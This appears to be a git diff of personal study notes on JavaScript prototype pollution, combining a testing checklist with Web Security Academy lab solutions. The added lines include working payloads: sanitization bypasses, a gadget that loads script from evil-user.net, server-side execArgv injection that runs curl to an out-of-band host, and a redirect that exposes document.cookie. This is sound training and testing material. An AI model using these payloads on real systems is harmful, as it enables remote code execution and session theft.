@@ -11,7 +11,7 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
 ### Via the URL
 
 ```
-https://test.com/?__proto__[foo]=bar
+test.com/?__proto__[foo]=bar
 ```
 
 ### Via JSON
@@ -41,34 +41,34 @@ A gadget provides a means of turning the prototype pollution vulnerability into 
 ### Examples
 
 ```
-https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
 ```
 
 ```
-https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
 ```
 
 ## Testing for client-side prototype pollution sources
 
-Try to inject an arbitrary property via the query string
+- [ ] Try to inject an arbitrary property via the query string
 
 ```
 target.com/?__proto__[foo]=bar
 ```
 
-Check in the console if the the prototype has been polluted
+- [ ] Check in the console if the the prototype has been polluted
 
 ```
 Object.prototype.foo
 ```
 
-If that doesn't work, try a different method
+- [ ] If that doesn't work, try a different method
 
 ```
 target.com/?__proto__.foo=bar
 ```
 
-Try sending in JSON
+- [ ] Try sending in JSON
 
 ```
 "__proto__":{
@@ -76,10 +76,48 @@ Try sending in JSON
 }
 ```
 
-## Finding client-side prototype pollution gadgets manually
+### Alternatives
 
-Placeholder
+- [ ] Try using the constructor
 
+```
+/?constructor.prototype.foo=bar
+```
+
+- [ ] Check for flawed key sanitization
+
+```
+/?__pro__proto__to__.foo=bar
+/?__pro__proto__to__[foo]=bar 
+/?__pro__proto__to__.foo=bar 
+/?constconstructorructor[protoprototypetype][foo]=bar 
+/?constconstructorructor.protoprototypetype.foo=bar
+```
+
+## Server-side prototype pollution
+
+- [ ] Try to override the default error status code
+- [ ] Try JSON spaces override
+- [ ] Try a charset override
+- [ ] Check for OOB interactions
+
+```
+"__proto__":{
+	"status":599
+}
+```
+
+```
+"__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" }
+```
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://1w2bdz4e6oa00ytizquj0kwiyekgu7jl2.oast.site')"
+    ]
+}
+```
 ## Labs
 
 ### DOM XSS via client-side prototype pollution
@@ -95,6 +133,36 @@ Placeholder
 ![searchLoggerAlternate.js](../attachments/prototype-pollution/image-3.png)
 
 ```
-https://0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
+0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
 ```
+
+### Placeholder
+
+![](../attachments/prototype-pollution/image-4.png)
+
+```
+0a39008e04e67439842b054b00190057.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
+```
+
+### Client-side prototype pollution in third-party libraries
+
+```
+<script>
+    location="https://0a6d00bc03d6c8ff82742a6100fd005d.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>
+```
+
+### Client-side prototype pollution via browser APIs
+
+![](../attachments/prototype-pollution/image-5.png)
+
+```
+0ad3005503235e1182dfca4b00bc000b.web-security-academy.net/?__proto__[value]=data:,alert(1)
+```
+
+### Bypassing flawed input filters for server-side prototype pollution
+
+Use the constructor instead of `__proto__`.
+
+![](../attachments/prototype-pollution/image-6.png)
 
